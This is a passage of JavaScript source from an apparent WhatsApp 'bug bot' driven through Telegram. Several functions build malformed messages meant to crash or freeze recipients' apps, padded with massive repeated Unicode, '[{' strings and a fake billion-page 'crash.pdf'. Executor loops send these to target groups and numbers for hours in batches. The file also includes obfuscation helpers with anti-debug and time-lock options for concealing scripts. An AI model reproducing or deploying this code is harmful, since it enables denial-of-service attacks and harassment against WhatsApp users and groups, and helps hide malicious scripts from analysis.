    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

await userSock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Telegram :: dgxeon13 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Telegram :: dgxeon13 ⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/dgxeon`
}
}
}, {})
  } catch (error) {
  console.error(`Error in iosvisible for ${userNumber}:`, error.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in groupmix: ${error.message}. Process stopped.`);
  return; // Stop the function
}
}

async function xeonAndroSpamGp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(1000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
  await userSock.relayMessage(target, message, {
      messageId: null,
      userJid: target,
    });
  } catch (error) {
    console.error(`Error in groupmix for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function forcergp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

    const rajaXeon = {
      key: {
        remoteJid: '120363401744741900@g.us',
        fromMe: true,
        id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
        participant: '916909137213@s.whatsapp.net'
      },
      messageTimestamp: 1753786706,
      pushName: 'Telegram: @dgxeon13',
      broadcast: false,
      status: 2,
      message: {
        conversation: 'Telegram: @dgxeon13',
        messageContextInfo: {
          messageSecret: new Uint8Array([
            123, 153, 59, 66, 69, 1, 31, 219,
            233, 201, 204, 107, 149, 77, 233, 100,
            80, 15, 30, 192, 133, 13, 171, 48,
            44, 27, 61, 135, 73, 149, 172, 105
          ])
        }
      },
      id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
      isBaileys: false,
      chat: '120363401744741900@g.us',
      fromMe: true,
      isGroup: true,
      sender: '916909137213@s.whatsapp.net',
      participant: '916909137213@s.whatsapp.net',
      mtype: 'conversation',
      msg: 'Telegram: @dgxeon13',
      body: 'Telegram: @dgxeon13',
      quoted: null,
      mentionedJid: [],
      text: 'Telegram: @dgxeon13',
      reply: function() {}, // Placeholder for function
      copy: function() {}, // Placeholder for function
      copyNForward: function() {} // Placeholder for function
    };

    await userSock.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 'Telegram: @dgxeon13',
          degreesLongitude: 'Telegram: @dgxeon13',
          name: `Telegram: @dgxeon13`,
          url: bugUrl,
          contextInfo: {
            forwardingScore: 508,
            isForwarded: true,
            isLiveLocation: true,
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: userNumber,
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/pdf",
                title: "crash",
                pageCount: 1000000000,
                fileName: "crash.pdf",
                contactVcard: true
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363274419284848@newsletter',
              serverMessageId: 1,
              newsletterName: " " + bug + bug
            },
            externalAdReply: {
              title: ' Telegram: @dgxeon13 ',
              body: 'Telegram: @dgxeon13',
              mediaType: 0,
              thumbnail: rajaXeon,
              jpegThumbnail: rajaXeon,
              mediaUrl: `https://www.youtube.com/@dgxeon`,
              sourceUrl: `https://www.youtube.com/@dgxeon`
            }
          }
        }
      },
      {
        messageId: null
      }
    );
  } catch (error) {
    console.error(`Error in forcergp for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function xeonUiKingGp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  try {
  
  const userSock = sessions.get(userNumber);
    
    const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: " Telegram: @dgxeon13",
hasMediaAttachment: false
},
body: {
text: "Telegram: @dgxeon13" + "ꦾ".repeat(19999)
},
nativeFlowMessage: {
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: `${"𑲭𑲭".repeat(19999)}`,
sections: [
{
title: "Telegram: @dgxeon13",
rows: []
},
{
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
]
})
}
]
}
}
}
}
}, {});

await userSock.relayMessage(target, msg.message, {
messageId: msg.key.id
});
  } catch (error) {
    console.error(`Error in xeonUiKingGp for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function xeonGroupDoc(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  try {
  
  const userSock = sessions.get(userNumber);
  
const media = await prepareWAMessageMedia(
            { image: { url: 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg' } },
            { upload: userSock.waUploadToServer }
        );
        const msg = {
           key: { id: 'Telegram: @dgxeon13' + new Date().getTime() },
            message: {
                "viewOnceMessage": {
                    "message": {
                        "interactiveMessage": {
                            "header": {
                                "title": "XeonBotInc" + "ꦾ".repeat(199999),
                                "hasMediaAttachment": true,
                                "imageMessage": media.imageMessage
                            },
                            "nativeFlowMessage": {
                                "buttons": [
                                    {
                                        "name": "review_and_pay",
                                        "buttonParamsJson": `{"currency":"BRL","payment_configuration":"merchant_categorization_code","payment_type":"","total_amount":{"value":1000,"offset":1000},"reference_id":"4TK4AUGZSOU","order_request_id":"4TK4AUGZQ1X","type":"physical-goods","order":{"status":"payment_requested","description":"","subtotal":{"value":1000,"offset":1000},"order_type":"","items":[{"retailer_id":"custom-item-4TK4AUBDBAX","name":"Telegram: @dgxeon13${"ྃ".repeat(99999)}","amount":{"value":1000,"offset":1000},"quantity":1}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"Telegram: @dgxeon13","key":"+916909137213","key_type":"PHONE"}},{"type":"cards","cards":{"enabled":true,"payment_gateway_checkout_enabled":false}}],"additional_note":"","share_payment_status":false}`
                                    }
                                ]
                            }
                        }
                    }
                }
            }
        };

        await userSock.relayMessage(target, msg.message.viewOnceMessage.message, {
            messageId: msg.key.id
        });
  } catch (error) {
    console.error(`Error in groupfriz for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function xeonGroupDocExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonGroupDoc(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in groupfriz: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonAndroidInvisibleKingGroupExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonAndroidInvisibleKing(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in autoclosegc: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xbetagcios(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);

const msg = {
    "viewOnceMessage": {
      "message": {
        "listResponseMessage": {
          "title": "Telegram: @dgxeon13",
          "listType": "SINGLE_SELECT",
          "singleSelectReply": {},
          "description": xeonKingIos
        }
      }
    }
  };
  const allmsg = generateWAMessageFromContent(target, proto.Message.fromObject(msg), {});
  userSock.relayMessage(target, allmsg.message, { messageId: allmsg.key.sender });
  } catch (error) {
    console.error(`Error in xbetagc ios for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function xbetagcandroid(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const media = {
      videoMessage: {
        url: 'https://mmg.whatsapp.net/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0&mms3=true',
        mimetype: 'video/mp4',
        fileSha256: Buffer.from('j0yv4uuRPfX3ZOfyZ0t8irS7K+MluEOyodghganzbJY=', 'base64'),
        fileLength: '2359888',
        mediaKey: Buffer.from('ld+SoEzJXiVsVakuPuyRWrJfWfvJJYa0CnooCPDdZWo=', 'base64'),
        fileEncSha256: Buffer.from('kibztIx3/O30AIs++tSPOZEIo/S7a6IpBO99d9ycNYk=', 'base64'),
        directPath: '/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0',
        mediaKeyTimestamp: '1751161073',
        jpegThumbnail: Buffer.from(
          '/9j//gAQTGF2YzYxLjE5LjEwMQD/2wBDAAgGBgcGBwgICAgICAkJCQoKCgkJCQkKCgoKCgoMDAwKCgoKCgoKDAwMDA0ODQ0NDA0ODg8PDxISEREVFRUZGR//xABxAAEBAQEBAQAAAAAAAAAAAAAHBgAIBAUBAQEBAQAAAAAAAAAAAAAAAAIAAwEQAAIBAwMDAwQDAQAAAAAAAAECAwUEERIABjEHEyIhFCNiUXFhFYEyEQADAQACAwEAAAAAAAAAAAAAAQIRQTEDcRIh/8AAEQgAGAAgAwEiAAIRAAMRAP/aAAwDAQACEQMRAD8Am+0/bShc1pl7eVKS9V4LkRKLeWONdOgNk6onJP8Au71exHCXzieq+xx73MSg/otbDP7GdmnbfkFdpNtFa0/5a2t1dSedrS1SaXyrGvjXXIjqgIz0w342k3vE63UQJJreoSkhmBkkHkd3C4dw8mA2lceoYGeg2HecN+jSPF9rXUz12fDq/bPtzSsJJe36yuzrGj30BZygLMRHHbvJpABJdgifds65VQ+NWFKt7ilyVA3jTnypOPoLA2QgVzGjNIMAt09m6dNolr2j5J8j57myhZ5B9KaSQskbN6lJRGLEr6SScYLE/jc33N4ZV+P02Go1G7iuPlzLHoQyeiT1SHSrKiJGR0VR/J9ztJt8BqZnf3Tz9uea8a4/S7izrK1PyG6M8T2QTThogh1ZkU5BGQCCN2q91+BxRXSRPyKM3WjW5jifTolEg8atNoXJGCAMEEjG+fN7fQj7F3T4VC10EueQiO4gjjANvA0kbJMJWcEz6DqwFwU/59jnch3F5rxuvUuKzo39ozm7W4la+VAoCxsuIyJXxktnSFA2Y724j//Z',
          'base64'
        )
      }
    };

    const cards = [];
    const header = {
      videoMessage: media.videoMessage,
      hasMediaAttachment: false,
      contextInfo: {
        forwardingScore: 666,
        isForwarded: true,
        stanzaId: `Telegram: @dgxeon13${Date.now()}`,
        participant: '0@s.whatsapp.net',
        remoteJid: 'status@broadcast',
        quotedMessage: {
          extendedTextMessage: {
            text: 'Telegram: @dgxeon13',
            contextInfo: {
              mentionedJid: ['13135550002@s.whatsapp.net'],
              externalAdReply: {
                title: 'Telegram: @dgxeon13',
                body: 'Telegram: @dgxeon13',
                thumbnailUrl: '',
                mediaType: 1,
                sourceUrl: 'https://tama.example.com',
                showAdAttribution: false
              }
            }
          }
        }
      }
    };

    for (let r = 0; r < 15; r++) {
      cards.push({
        header,
        nativeFlowMessage: {
          messageParamsJson: '{'.repeat(10000)
        }
      });
    }

    const tmsg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: 'Telegram: @dgxeon13' },
              carouselMessage: { cards, messageVersion: 1 },
              contextInfo: {
                businessMessageForwardInfo: { businessOwnerJid: '13135550002@s.whatsapp.net' },
                stanzaId: `Telegram: @dgxeon13${Math.floor(Math.random() * 99999)}`,
                forwardingScore: 100,
                isForwarded: true,
                mentionedJid: ['13135550002@s.whatsapp.net'],
                externalAdReply: {
                  title: 'Telegram: @dgxeon13',
                  body: '',
                  thumbnailUrl: 'https://example.com/',
                  mediaType: 1,
                  mediaUrl: '',
                  sourceUrl: 'https://example.com',
                  showAdAttribution: false
                }
              }
            }
          }
        }
      },
      {}
    );

    await userSock.relayMessage(target, tmsg.message, {
      messageId: tmsg.key.id
    });
  } catch (error) {
    console.error(`Error in xbetagc andro for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function getChannelIdFromInviteLink(inviteLink, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  const userBot = getUserBot(botInstance);

  if (!inviteLink) {
    await userBot.sendMessage(chatId, '❌ Provide a WhatsApp channel invite link.\nExample: /channelid https://whatsapp.com/channel/xxxxxxxxxxxxxxxx');
    return;
  }

  if (!inviteLink.startsWith('https://whatsapp.com/channel/')) {
    await userBot.sendMessage(chatId, '❌ Invalid channel invite link. It must start with https://whatsapp.com/channel/');
    return;
  }

  try {
    // Clean invite code
    const inviteCodeRaw = inviteLink.split('https://whatsapp.com/channel/')[1];
    const inviteCode = inviteCodeRaw.split(/[?&]/)[0].trim();

    if (!inviteCode || inviteCode.length < 10) {
      await userBot.sendMessage(chatId, '❌ Invalid channel invite link format.');
      return;
    }

    console.log(`[DEBUG] Clean invite code: "${inviteCode}"`);

    const userSock = sessions.get(userNumber);

    // Call newsletterMetadata
    const metadata = await userSock.newsletterMetadata("invite", inviteCode);

    console.log('[DEBUG] Raw metadata:', JSON.stringify(metadata, null, 2));

    if (!metadata?.id) {
      await userBot.sendMessage(chatId, '❌ Failed to fetch channel ID. The invite link may be invalid or expired.');
      return;
    }

    await userBot.sendMessage(chatId, `${metadata.id}`);

  } catch (error) {
    console.error(`Error in getChannelIdFromInviteLink for ${userNumber}:`, error);

    // More detailed error message
    let errorMsg = error.message || 'Unknown error';

    if (errorMsg.includes('is not valid JSON')) {
      errorMsg = 'WhatsApp returned invalid response (not JSON). The invite link is probably invalid, expired, or the channel is private.';
    }

    await userBot.sendMessage(chatId, `❌ Failed to process channel invite link: ${errorMsg}`);
  }
}

async function getGroupIdFromInviteLink(inviteLink, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  const userBot = getUserBot(botInstance);

  // Validate input
  if (!inviteLink) {
    await userBot.sendMessage(chatId, '❌ Provide a WhatsApp group invite link.\nExample: /groupid https://chat.whatsapp.com/xxxxxxxxxxxxxxxx');
    return;
  }

  // Check if the input is a valid URL and contains 'whatsapp.com'
  if (!inviteLink.startsWith('https://chat.whatsapp.com/')) {
    await userBot.sendMessage(chatId, '❌ Invalid group invite link. It must start with https://chat.whatsapp.com/');
    return;
  }

  try {
    // Extract and clean invite code (remove any query params like ?text= or &utm_source=...)
    const inviteCodeRaw = inviteLink.split('https://chat.whatsapp.com/')[1];
    const inviteCode = inviteCodeRaw.split(/[?&]/)[0]; // Clean URL parameters

    if (!inviteCode || inviteCode.length < 10) {
      await userBot.sendMessage(chatId, '❌ Invalid group invite link format.');
      return;
    }

    const userSock = sessions.get(userNumber);
    const groupId = await userSock.groupAcceptInvite(inviteCode);

    if (!groupId) {
      await userBot.sendMessage(chatId, '❌ Failed to join group. The group may have approval enabled, you may have been removed, or the invite link may have expired. Please join the group manually and try /listgc.');
      return;
    }

    await userBot.sendMessage(chatId, `✅ Group ID: ${groupId}`);
  } catch (error) {
    console.error(`Error in getGroupIdFromInviteLink for ${userNumber}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process group invite link: ${error.message}. The group may have approval enabled, you may have been removed, or the invite link may have expired. Please join the group manually and try /listgc.`);
  }
}

async function sendOfferCall(userSock, target) {
  try {
    // Note: @whiskeysockets/baileys does not currently support sending VoIP call offers.
    // The 'offerCall' method is included as per user request but may throw an error if not implemented.
    await userSock.offerCall(target);
    console.log(chalk.white.bold(`Success: Sent offer call to ${target}`));
    return true;
  } catch (error) {
    console.error(chalk.white.bold(`Failed to send offer call to ${target}:`, error));
    return false;
  }
}

async function sendMessagesForDuration(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const userBot = getUserBot(botInstance);

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log('Delivery completed within specified duration.');
      await userBot.sendMessage(chatId, `✅ Delivery completed to ${target.replace('@s.whatsapp.net', '')}.`);
      return;
    }

    if (count < 800) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      await xjammer2(target, userNumber, chatId, botInstance, true);
      count++;
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await sendNext();
    } else {
      console.log(chalk.green(`Completed sending ${count} bvg to ${target}`));
      count = 0;
      console.log(chalk.yellow('Pausing before next batch...'));
      await new Promise((resolve) => setTimeout(resolve, 5000));
      await sendNext();
    }
  };

  await sendNext();
}

async function sendMessagesForDurationX(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const userBot = getUserBot(botInstance);

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log('Delivery completed within specified duration.');
      await userBot.sendMessage(chatId, `✅ Delivery completed to ${target.replace('@s.whatsapp.net', '')}.`);
      return;
    }

    if (count < 800) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      await xjammer(target, userNumber, chatId, botInstance);
      count++;
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await sendNext();
    } else {
      console.log(chalk.green(`Completed sending ${count} bvg to ${target}`));
      count = 0;
      console.log(chalk.yellow('Pausing before next batch...'));
      await new Promise((resolve) => setTimeout(resolve, 5000));
      await sendNext();
    }
  };

  await sendNext();
}

//enc/dec 
const JsConfuser = require('js-confuser');
const { webcrack } = require('webcrack');
const fse = require('fs-extra');

// === ALL OBFUSCATION CONFIGS & SPECIAL FUNCTIONS ===
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

const obfuscateTimeLocked = async (fileContent, days) => {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + parseInt(days));
    const expiryTimestamp = expiryDate.getTime();
    try {
        const obfuscated = await JsConfuser.obfuscate(
            `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}${fileContent}})();`,
            {
                target: "node",
                compact: true,
                renameVariables: true,
                renameGlobals: true,
                identifierGenerator: "randomized",
                /*stringCompression: true, */
                stringConcealing: true,
                stringEncoding: true,
                controlFlowFlattening: 0.75,
                flatten: true,
                /*shuffle: true,*/
                rgf: false,
                opaquePredicates: {
                    count: 6,
                    complexity: 4
                },
                dispatcher: true,
                globalConcealing: true,
                lock: {
                    selfDefending: true,
                    antiDebug: (code) => `if(typeof debugger!=='undefined'||process.env.NODE_ENV==='debug')throw new Error('Debugging disabled');${code}`,
                    integrity: true,
                    tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
                },
                duplicateLiteralsRemoval: true
            }
        );
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Obfuscation result is not a string");
        }
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Failed to obfuscate: ${error.message}`);
    }
};

// Command /timez untuk enkripsi dengan masa aktif dalam hari

// Konstanta fungsi async untuk obfuscation Quantum Vortex Encryption
const obfuscateQuantum = async (fileContent) => {
    // Generate identifier unik berdasarkan waktu lokal
    const generateTimeBasedIdentifier = () => {
        const timeStamp = new Date().getTime().toString().slice(-5);
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*";
        let identifier = "qV_";
        for (let i = 0; i < 7; i++) {
            identifier += chars[Math.floor((parseInt(timeStamp[i % 5]) + i * 2) % chars.length)];
        }
        return identifier;
    };

    // Tambahkan kode phantom berdasarkan milidetik
    const currentMilliseconds = new Date().getMilliseconds();
    const phantomCode = currentMilliseconds % 3 === 0 ? `if(Math.random()>0.999)console.log('PhantomTrigger');` : "";

    try {
        const obfuscated = await JsConfuser.obfuscate(fileContent + phantomCode, {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: generateTimeBasedIdentifier,
            /*stringCompression: true, */
            stringConcealing: false,
            stringEncoding: true,
            controlFlowFlattening: 0.85, // Intensitas lebih tinggi untuk versi 2.0
            flatten: true,
            /*shuffle: true,*/
            rgf: true,
            opaquePredicates: {
                count: 8, // Peningkatan count untuk versi 2.0
                complexity: 5
            },
            dispatcher: true,
            globalConcealing: true,
            lock: {
                selfDefending: true,
                antiDebug: (code) => `if(typeof debugger!=='undefined'||(typeof process!=='undefined'&&process.env.NODE_ENV==='debug'))throw new Error('Debugging disabled');${code}`,
                integrity: true,
                tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
            },
            duplicateLiteralsRemoval: true
        });
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Obfuscation result is not a string");
        }
        // Self-evolving code dengan XOR dinamis
        const key = currentMilliseconds % 256;
        obfuscatedCode = `(function(){let k=${key};return function(c){return c.split('').map((x,i)=>String.fromCharCode(x.charCodeAt(0)^(k+(i%16)))).join('');}('${obfuscatedCode}');})()`;
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Failed to obfuscate: ${error.message}`);
    }
};

// Command /quantum untuk enkripsi Quantum Vortex Encryption


// Konfigurasi obfuscation untuk Siu + Calcrick style dengan keamanan ekstrem
const getSiuCalcrickObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `CalceKarik和SiuSiu无与伦比的帅气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
